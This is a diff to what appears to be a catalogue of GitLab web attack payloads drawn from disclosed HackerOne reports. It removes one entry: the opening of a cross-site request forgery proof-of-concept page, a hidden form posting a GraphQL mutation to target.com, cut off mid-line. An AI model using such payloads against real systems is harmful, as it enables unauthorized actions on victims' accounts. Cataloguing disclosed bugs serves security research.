@@ -1,6 +1,6 @@
 # GitLab
 
-88 payloads.
+87 payloads.
 
 ### `65437ea7`
 
@@ -643,25 +643,6 @@ Bob->>Alice: Hi Alice
 ```
 
 — [Stored DOM XSS via Mermaid chart](https://hackerone.com/reports/1103258) · GitLab · [taraszelyk](https://hackerone.com/taraszelyk) · $3,000.0
-
-### `119ac9d7`
-
-```
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <meta name="referrer" content="none">
-    <meta name="referrer" content="no-referrer">
-</head>
-<body>
-      <form action="https://target.com/api/graphql/" id="csrf-form" method="GET">
-        <input name="query" value="mutation CreateSnippet($input: CreateSnippetInput!) {  createSnippet(input: $
-```
-
-— [CSRF on /api/graphql allows executing mutations through GET requests](https://hackerone.com/reports/1122408) · GitLab · [az3z3l](https://hackerone.com/az3z3l) · $3,370.0
 
 ### `561ce09c`
 
